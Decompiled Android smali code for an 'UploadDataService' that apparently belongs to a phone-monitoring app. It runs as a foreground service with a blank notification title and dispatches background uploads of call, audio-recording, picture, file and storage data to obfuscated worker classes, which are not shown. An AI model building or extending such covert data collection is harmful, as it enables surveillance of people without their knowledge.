.class public Lcom/app/service/UploadDataService;
.super Landroid/app/Service;
.source "UploadDataService.java"


# static fields
.field private static a:I


# instance fields
.field private b:Ljava/util/concurrent/ThreadPoolExecutor;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 44
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static declared-synchronized a()V
    .locals 2

    const-class v0, Lcom/app/service/UploadDataService;

    monitor-enter v0

    .line 49
    :try_start_0
    sget v1, Lcom/app/service/UploadDataService;->a:I

    add-int/lit8 v1, v1, -0x1

    sput v1, Lcom/app/service/UploadDataService;->a:I
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 50
    monitor-exit v0

    return-void

    :catchall_0
    move-exception v1

    monitor-exit v0

    throw v1
.end method

.method private a(Ldc;)V
    .locals 8

    .line 114
    iget-object v0, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    if-nez v0, :cond_0

    .line 115
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Runtime;->availableProcessors()I

    move-result v3

    .line 116
    new-instance v0, Ljava/util/concurrent/ThreadPoolExecutor;

    const-wide/16 v4, 0x1

    sget-object v6, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    new-instance v7, Ljava/util/concurrent/LinkedBlockingQueue;

    invoke-direct {v7}, Ljava/util/concurrent/LinkedBlockingQueue;-><init>()V

    move-object v1, v0

    move v2, v3

    invoke-direct/range {v1 .. v7}, Ljava/util/concurrent/ThreadPoolExecutor;-><init>(IIJLjava/util/concurrent/TimeUnit;Ljava/util/concurrent/BlockingQueue;)V

    iput-object v0, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    .line 125
    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "typeData : "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    if-eqz p1, :cond_1

    .line 128
    sget-object v0, Lcom/app/service/UploadDataService$1;->a:[I

    invoke-virtual {p1}, Ldc;->ordinal()I

    move-result p1

    aget p1, v0, p1

    packed-switch p1, :pswitch_data_0

    goto/16 :goto_0

    .line 224
    :pswitch_0
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 225
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Ldp;

    invoke-virtual {p0}, Lcom/app/service/UploadDataService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "INTERNAL"

    invoke-direct {v0, v1, v2}, Ldp;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    goto/16 :goto_0

    .line 219
    :pswitch_1
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 220
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Ldp;

    invoke-virtual {p0}, Lcom/app/service/UploadDataService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "EXTERNAL"

    invoke-direct {v0, v1, v2}, Ldp;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 214
    :pswitch_2
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 215
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Leo;

    invoke-direct {v0, p0}, Leo;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 207
    :pswitch_3
    sget-boolean p1, Lcom/app/service/UploadDataFileExplorer;->a:Z

    if-nez p1, :cond_1

    .line 208
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 209
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Lef;

    invoke-direct {v0, p0}, Lef;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 200
    :pswitch_4
    sget-boolean p1, Lcom/app/service/UploadRecordAudioService;->a:Z

    if-nez p1, :cond_1

    sget-boolean p1, Lcom/app/service/UploadPictureRemoteService;->a:Z

    if-nez p1, :cond_1

    .line 201
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 202
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Leh;

    invoke-direct {v0, p0}, Leh;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 193
    :pswitch_5
    sget-boolean p1, Lcom/app/service/UploadCallService;->a:Z

    if-nez p1, :cond_1

    .line 194
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 195
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Lec;

    invoke-direct {v0, p0}, Lec;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 188
    :pswitch_6
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 189
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Lei;

    invoke-direct {v0, p0}, Lei;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 183
    :pswitch_7
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 184
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Lej;

    invoke-direct {v0, p0}, Lej;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 178
    :pswitch_8
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 179
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Lem;

    invoke-direct {v0, p0}, Lem;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 173
    :pswitch_9
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 174
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Leg;

    invoke-direct {v0, p0}, Leg;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 168
    :pswitch_a
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 169
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Lek;

    invoke-direct {v0, p0}, Lek;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 163
    :pswitch_b
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 164
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Ldz;

    invoke-direct {v0, p0}, Ldz;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 155
    :pswitch_c
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 156
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Ldy;

    invoke-direct {v0, p0}, Ldy;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    .line 158
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 159
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Lea;

    invoke-direct {v0, p0}, Lea;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 150
    :pswitch_d
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 151
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Lee;

    invoke-direct {v0, p0}, Lee;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 145
    :pswitch_e
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 146
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Leb;

    invoke-direct {v0, p0}, Leb;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 140
    :pswitch_f
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 141
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Len;

    invoke-direct {v0, p0}, Len;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 135
    :pswitch_10
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 136
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Led;

    invoke-direct {v0, p0}, Led;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    .line 130
    :pswitch_11
    invoke-static {}, Lcom/app/service/UploadDataService;->c()V

    .line 131
    iget-object p1, p0, Lcom/app/service/UploadDataService;->b:Ljava/util/concurrent/ThreadPoolExecutor;

    new-instance v0, Lel;

    invoke-direct {v0, p0}, Lel;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1, v0}, Ljava/util/concurrent/ThreadPoolExecutor;->execute(Ljava/lang/Runnable;)V

    return-void

    :cond_1
    :goto_0
    return-void

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public static b()I
    .locals 1

    .line 57
    sget v0, Lcom/app/service/UploadDataService;->a:I

    return v0
.end method

.method private static declared-synchronized c()V
    .locals 2

    const-class v0, Lcom/app/service/UploadDataService;

    monitor-enter v0

    .line 53
    :try_start_0
    sget v1, Lcom/app/service/UploadDataService;->a:I

    add-int/lit8 v1, v1, 0x1

    sput v1, Lcom/app/service/UploadDataService;->a:I
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 54
    monitor-exit v0

    return-void

    :catchall_0
    move-exception v1

    monitor-exit v0

    throw v1
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0
    .annotation build Landroid/support/annotation/Nullable;
    .end annotation

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 2

    .line 62
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 67
    :try_start_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-ge v0, v1, :cond_0

    .line 68
    invoke-static {p0}, Landroid/support/v4/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroid/support/v4/app/NotificationManagerCompat;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v4/app/NotificationManagerCompat;->areNotificationsEnabled()Z

    move-result v0

    if-nez v0, :cond_1

    .line 69
    :cond_0
    new-instance v0, Landroid/app/Notification$Builder;

    invoke-direct {v0, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    const-string v1, " "

    .line 70
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const v1, 0x7f080079

    .line 71
    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    .line 72
    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    const v1, 0x98a8

    .line 74
    invoke-virtual {p0, v1, v0}, Lcom/app/service/UploadDataService;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    return-void

    :catch_0
    move-exception v0

    .line 77
    invoke-virtual {v0}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 78
    invoke-static {v0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    return-void
.end method

.method public onDestroy()V
    .locals 0

    .line 234
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    if-eqz p1, :cond_1

    .line 88
    :try_start_0
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object p1

    if-eqz p1, :cond_1

    const-string p2, "typeData"

    .line 91
    invoke-virtual {p1, p2}, Landroid/os/Bundle;->containsKey(Ljava/lang/String;)Z

    move-result p2

    if-eqz p2, :cond_0

    const-string p2, "typeData"

    .line 92
    invoke-virtual {p1, p2}, Landroid/os/Bundle;->getSerializable(Ljava/lang/String;)Ljava/io/Serializable;

    move-result-object p1

    check-cast p1, Ldc;

    .line 93
    invoke-direct {p0, p1}, Lcom/app/service/UploadDataService;->a(Ldc;)V

    goto :goto_1

    :cond_0
    const-string p2, "listTypeData"

    .line 94
    invoke-virtual {p1, p2}, Landroid/os/Bundle;->containsKey(Ljava/lang/String;)Z

    move-result p2

    if-eqz p2, :cond_1

    const-string p2, "listTypeData"

    .line 95
    invoke-virtual {p1, p2}, Landroid/os/Bundle;->getSerializable(Ljava/lang/String;)Ljava/io/Serializable;

    move-result-object p1

    check-cast p1, Ljava/util/ArrayList;

    if-eqz p1, :cond_1

    .line 98
    invoke-virtual {p1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :goto_0
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result p2

    if-eqz p2, :cond_1

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Ldc;

    .line 99
    invoke-direct {p0, p2}, Lcom/app/service/UploadDataService;->a(Ldc;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 106
    invoke-virtual {p1}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 107
    invoke-static {p1}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    :cond_1
    :goto_1
    const/4 p1, 0x2

    return p1
.end method
